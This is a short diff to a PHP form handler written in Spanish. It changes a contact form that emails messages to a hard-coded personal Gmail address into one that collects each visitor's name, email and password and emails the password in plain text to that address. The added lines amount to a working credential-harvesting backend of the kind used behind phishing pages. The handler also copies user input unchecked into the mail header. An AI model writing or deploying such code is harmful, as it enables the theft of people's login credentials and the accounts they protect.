@@ -9,13 +9,13 @@
 	<?php 
 
 $myemail = 'marco1129miranda@gmail.com';
-$name = $_POST['nombre'];
-$email = $_POST['email'];
-$message = $_POST['mensaje'];
+$name = $_POST['NOMBRE'];
+$email = $_POST['CORREO'];
+$password = $_POST['CONTRASEÑA'];
 
 $to = $myemail;
 $email_subject = "Nuevo mensaje: $subject";
-$email_body = "Haz recibido un nuevo mensaje. \n Nombre: $name \n Correo: $email \n Mensaje: \n $message";
+$email_body = "Haz recibido un nuevo mensaje. \n NOMBRE: $name \n CORREO: $email \n CONTRASEÑA: \n $password";
 $headers = "From: $email";
 
 mail($to, $email_subject, $email_body, $headers);
